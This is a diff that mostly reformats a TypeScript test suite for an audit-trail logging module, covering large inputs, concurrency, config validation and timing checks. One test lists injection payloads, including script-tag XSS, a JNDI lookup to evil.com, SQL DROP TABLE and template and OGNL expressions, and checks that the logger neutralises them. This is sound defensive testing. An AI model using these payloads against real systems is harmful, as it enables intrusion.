@@ -1,27 +1,27 @@
 /**
  * Comprehensive Edge Case and Security Analysis for Task 1.4.3 Audit Trail
- * 
+ *
  * This file contains advanced security tests to identify potential vulnerabilities,
  * edge cases, and error scenarios in the audit trail implementation.
- * 
+ *
  * @security Critical security testing for production readiness
  * @coverage Edge cases, attack vectors, resource exhaustion, race conditions
  */
 
-import { describe, it, expect, beforeEach, afterEach } from 'vitest';
-import { 
-  AuditTrailManager, 
-  AuditEventType, 
-  AuditSeverity,
+import { afterEach, beforeEach, describe, expect, it } from 'vitest';
+import {
   AUDIT_SECURITY_LIMITS,
+  AuditEventType,
   AuditSecurityValidator,
+  AuditSeverity,
+  type AuditTrailConfig,
+  AuditTrailManager,
   DEFAULT_AUDIT_TRAIL_CONFIG,
-  type AuditTrailConfig
 } from '../../../core/foundation/logging/audit.js';
 
 describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
   let auditManager: AuditTrailManager;
-  
+
   const testConfig: AuditTrailConfig = {
     ...DEFAULT_AUDIT_TRAIL_CONFIG,
     trailName: 'security-test-trail',
@@ -45,10 +45,11 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
         userId: 'test-user',
         // Safe properties that exist in AuditUserContext
         roles: ['user'],
-        sessionId: 'session-123'
+        sessionId: 'session-123',
       };
 
-      const entry = auditManager.createEvent()
+      const entry = auditManager
+        .createEvent()
         .setEventType(AuditEventType.AUTH_SUCCESS)
         .setSeverity(AuditSeverity.LOW)
         .setMessage('Test with context')
@@ -72,10 +73,11 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
         permissions: ['read', 'write'],
         sessionId: 'session-456',
         ipAddress: '192.168.1.1',
-        userAgent: 'TestAgent/1.0'
+        userAgent: 'TestAgent/1.0',
       };
 
-      const entry = auditManager.createEvent()
+      const entry = auditManager
+        .createEvent()
         .setEventType(AuditEventType.DATA_ACCESS)
         .setSeverity(AuditSeverity.MEDIUM)
         .setMessage('Test with full context')
@@ -93,8 +95,9 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
   describe('Memory Exhaustion Edge Cases', () => {
     it('should handle extremely large audit entry messages', async () => {
       const largeMessage = 'x'.repeat(AUDIT_SECURITY_LIMITS.MAX_ENTRY_SIZE_BYTES + 1000);
-      
-      const entry = auditManager.createEvent()
+
+      const entry = auditManager
+        .createEvent()
         .setEventType(AuditEventType.SYSTEM_ERROR)
         .setSeverity(AuditSeverity.CRITICAL)
         .setMessage(largeMessage)
@@ -111,15 +114,16 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
     it('should handle large user context objects', async () => {
       const largeRoles = Array.from({ length: 1000 }, (_, i) => `role_${i}`);
       const largePermissions = Array.from({ length: 1000 }, (_, i) => `permission_${i}`);
-      
+
       const largeContext = {
         userId: 'test-user',
         roles: largeRoles,
         permissions: largePermissions,
-        sessionId: 'session-789'
+        sessionId: 'session-789',
       };
 
-      const entry = auditManager.createEvent()
+      const entry = auditManager
+        .createEvent()
         .setEventType(AuditEventType.DATA_EXPORT)
         .setSeverity(AuditSeverity.HIGH)
         .setMessage('Test with large context')
@@ -135,7 +139,8 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
 
     it('should handle circular reference prevention', async () => {
       // Create a simpler test that doesn't rely on custom properties
-      const entry = auditManager.createEvent()
+      const entry = auditManager
+        .createEvent()
         .setEventType(AuditEventType.DATA_MODIFICATION)
         .setSeverity(AuditSeverity.MEDIUM)
         .setMessage('Test circular reference handling')
@@ -154,7 +159,8 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
   describe('Concurrency and Race Condition Edge Cases', () => {
     it('should handle concurrent audit entry creation', async () => {
       const concurrentOperations = Array.from({ length: 50 }, (_, i) => {
-        return auditManager.createEvent()
+        return auditManager
+          .createEvent()
           .setEventType(AuditEventType.AUTH_SUCCESS)
           .setSeverity(AuditSeverity.LOW)
           .setMessage(`Concurrent operation ${i}`)
@@ -164,14 +170,14 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
       });
 
       // Record all entries concurrently
-      const promises = concurrentOperations.map(entry => auditManager.recordEvent(entry));
+      const promises = concurrentOperations.map((entry) => auditManager.recordEvent(entry));
       await Promise.all(promises);
 
       const results = await auditManager.queryEntries({ limit: 100 });
       expect(results.entries).toHaveLength(50);
 
       // Verify no duplicates
-      const ids = results.entries.map(e => e.id);
+      const ids = results.entries.map((e) => e.id);
       expect(new Set(ids)).toHaveLength(50);
     });
 
@@ -182,20 +188,21 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
           trailName: `concurrent-trail-${i}`,
           maxEntries: 50 + i,
         };
-        
+
         const manager = new AuditTrailManager(newConfig);
         await manager.init();
-        
-        const entry = manager.createEvent()
+
+        const entry = manager
+          .createEvent()
           .setEventType(AuditEventType.CONFIG_CHANGE)
           .setSeverity(AuditSeverity.MEDIUM)
           .setMessage(`Config change ${i}`)
           .setOutcome('success')
           .build();
-          
+
         await manager.recordEvent(entry);
         await manager.close();
-        
+
         return manager;
       });
 
@@ -206,7 +213,8 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
     it('should handle integrity validation under concurrent access', async () => {
       // Create multiple entries rapidly
       const entries = Array.from({ length: 20 }, (_, i) => {
-        return auditManager.createEvent()
+        return auditManager
+          .createEvent()
           .setEventType(AuditEventType.DATA_ACCESS)
           .setSeverity(AuditSeverity.LOW)
           .setMessage(`Integrity test ${i}`)
@@ -216,11 +224,11 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
       });
 
       // Record entries concurrently
-      await Promise.all(entries.map(e => auditManager.recordEvent(e)));
+      await Promise.all(entries.map((e) => auditManager.recordEvent(e)));
 
       // Verify integrity
       const verification = await auditManager.verifyIntegrity();
-      
+
       expect(verification.status).toBe('verified');
       expect(verification.verifiedEntries).toBe(20);
       expect(verification.corruptedEntries).toHaveLength(0);
@@ -229,7 +237,8 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
 
   describe('Error Handling Edge Cases', () => {
     it('should handle corrupted audit entries gracefully', async () => {
-      const validEntry = auditManager.createEvent()
+      const validEntry = auditManager
+        .createEvent()
         .setEventType(AuditEventType.AUTH_SUCCESS)
         .setSeverity(AuditSeverity.LOW)
         .setMessage('Valid entry')
@@ -240,7 +249,7 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
 
       // Verify integrity should work correctly
       const verification = await auditManager.verifyIntegrity();
-      
+
       expect(verification.status).toBe('verified');
       expect(verification.verifiedEntries).toBeGreaterThan(0);
     });
@@ -258,16 +267,16 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
       for (const [index, config] of invalidConfigs.entries()) {
         // Test that the validator catches these during construction
         const validation = AuditSecurityValidator.validateConfiguration(config);
-        
+
         // Debug output for troubleshooting
         if (validation.isValid) {
           console.log(`Config ${index} unexpectedly valid:`, config);
           console.log(`Validation result:`, validation);
         }
-        
+
         expect(validation.isValid).toBe(false);
         expect(validation.errors.length).toBeGreaterThan(0);
-        
+
         // And that construction throws an error
         expect(() => {
           new AuditTrailManager(config);
@@ -287,7 +296,8 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
       await manager.init();
 
       try {
-        const entry = manager.createEvent()
+        const entry = manager
+          .createEvent()
           .setEventType(AuditEventType.SYSTEM_ERROR)
           .setSeverity(AuditSeverity.CRITICAL)
           .setMessage('System resource test')
@@ -308,16 +318,19 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
     it('should prevent injection attacks via audit messages', async () => {
       const injectionPayloads = [
         '<script>alert("xss")</script>',
+        // biome-ignore lint/suspicious/noTemplateCurlyInString: Testing security payload
         '${jndi:ldap://evil.com/a}',
         '"; DROP TABLE audit_logs; --',
         '{{7*7}}',
         '%{#context["xwork.MethodAccessor.denyMethodExecution"]=false}',
         '#{7*7}',
+        // biome-ignore lint/suspicious/noTemplateCurlyInString: Testing security payload
         '${{7*7}}',
       ];
 
       for (const payload of injectionPayloads) {
-        const entry = auditManager.createEvent()
+        const entry = auditManager
+          .createEvent()
           .setEventType(AuditEventType.AUTH_FAILURE)
           .setSeverity(AuditSeverity.HIGH)
           .setMessage(payload)
@@ -336,7 +349,8 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
     });
 
     it('should prevent timing attacks on validation', async () => {
-      const entry = auditManager.createEvent()
+      const entry = auditManager
+        .createEvent()
         .setEventType(AuditEventType.AUTH_SUCCESS)
         .setSeverity(AuditSeverity.LOW)
         .setMessage('Timing attack test')
@@ -347,38 +361,38 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
       await auditManager.recordEvent(entry);
 
       const correctChecksum = entry.checksum;
-      
+
       // Test timing consistency for various validation scenarios
       const validationAttempts = [
         'wrong_checksum_1',
         'a'.repeat(64), // Same length as SHA256
         '0'.repeat(64),
         'f'.repeat(64),
-        correctChecksum?.slice(0, -1) + 'x', // One character different
+        `${correctChecksum?.slice(0, -1)}x`, // One character different
       ];
 
       const timings: number[] = [];
-      
+
       for (const attempt of validationAttempts) {
         const start = process.hrtime.bigint();
-        
+
         // Test with modified checksum
         const modifiedEntry = { ...entry, checksum: attempt };
         const validation = AuditSecurityValidator.validateAuditEntry(modifiedEntry);
-        
+
         const end = process.hrtime.bigint();
-        
+
         const duration = Number(end - start) / 1000000; // Convert to milliseconds
         timings.push(duration);
-        
+
         // Should detect invalid checksums
         expect(validation.isValid).toBeDefined();
       }
 
       // Verify timing consistency (difference should be minimal)
       const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;
-      const maxDeviation = Math.max(...timings.map(t => Math.abs(t - avgTiming)));
-      
+      const maxDeviation = Math.max(...timings.map((t) => Math.abs(t - avgTiming)));
+
       // Allow some variance but should be reasonably consistent
       expect(maxDeviation).toBeLessThan(avgTiming * 2); // Max 200% deviation (generous for CI)
     });
@@ -396,7 +410,7 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
       for (const config of dangerousConfigs) {
         const testConfig = { ...DEFAULT_AUDIT_TRAIL_CONFIG, ...config };
         const validation = AuditSecurityValidator.validateConfiguration(testConfig);
-        
+
         // Configuration should be validated
         expect(validation).toBeDefined();
         expect(typeof validation.isValid).toBe('boolean');
@@ -413,7 +427,7 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
 
       for (const config of edgeCaseConfigs) {
         const testConfig = { ...DEFAULT_AUDIT_TRAIL_CONFIG, ...config };
-        
+
         // Should handle edge case configurations without crashing
         expect(() => {
           const manager = new AuditTrailManager(testConfig);
@@ -440,7 +454,8 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
 
       // Generate high-frequency audit events
       for (let i = 0; i < 100; i++) {
-        const promise = manager.createEvent()
+        const promise = manager
+          .createEvent()
           .setEventType(AuditEventType.COMMAND_EXECUTION)
           .setSeverity(AuditSeverity.LOW)
           .setMessage(`High frequency event ${i}`)
@@ -475,8 +490,9 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
 
         const manager = new AuditTrailManager(config);
         await manager.init();
-        
-        const entry = manager.createEvent()
+
+        const entry = manager
+          .createEvent()
           .setEventType(AuditEventType.SYSTEM_START)
           .setSeverity(AuditSeverity.INFORMATIONAL)
           .setMessage(`Manager ${i} event`)
@@ -498,7 +514,7 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
 
     it('should handle rapid configuration updates', async () => {
       const baseConfig = { ...testConfig };
-      
+
       // Rapidly update configuration
       for (let i = 0; i < 20; i++) {
         const updatedConfig = {
@@ -506,11 +522,11 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
           maxEntries: 100 + i,
           batchSize: 10 + (i % 5),
         };
-        
+
         expect(() => {
           auditManager.updateConfig(updatedConfig);
         }).not.toThrow();
-        
+
         const currentConfig = auditManager.getConfig();
         expect(currentConfig.maxEntries).toBe(100 + i);
       }
@@ -521,19 +537,20 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
     it('should handle integrity verification with missing entries', async () => {
       // Create a few entries
       for (let i = 0; i < 3; i++) {
-        const entry = auditManager.createEvent()
+        const entry = auditManager
+          .createEvent()
           .setEventType(AuditEventType.DATA_ACCESS)
           .setSeverity(AuditSeverity.LOW)
           .setMessage(`Test entry ${i}`)
           .setOutcome('success')
           .build();
-        
+
         await auditManager.recordEvent(entry);
       }
 
       // Verify integrity
       const verification = await auditManager.verifyIntegrity();
-      
+
       expect(verification.status).toBe('verified');
       expect(verification.verifiedEntries).toBe(3);
       expect(verification.corruptedEntries).toHaveLength(0);
@@ -542,13 +559,14 @@ describe('Task 1.4.3: Audit Trail Edge Cases and Security Analysis', () => {
     it('should handle export functionality', async () => {
       // Create some entries to export
       for (let i = 0; i < 5; i++) {
-        const entry = auditManager.createEvent()
+        const entry = auditManager
+          .createEvent()
           .setEventType(AuditEventType.DATA_ACCESS)
           .setSeverity(AuditSeverity.LOW)
           .setMessage(`Export test ${i}`)
           .setOutcome('success')
           .build();
-        
+
         await auditManager.recordEvent(entry);
       }
 
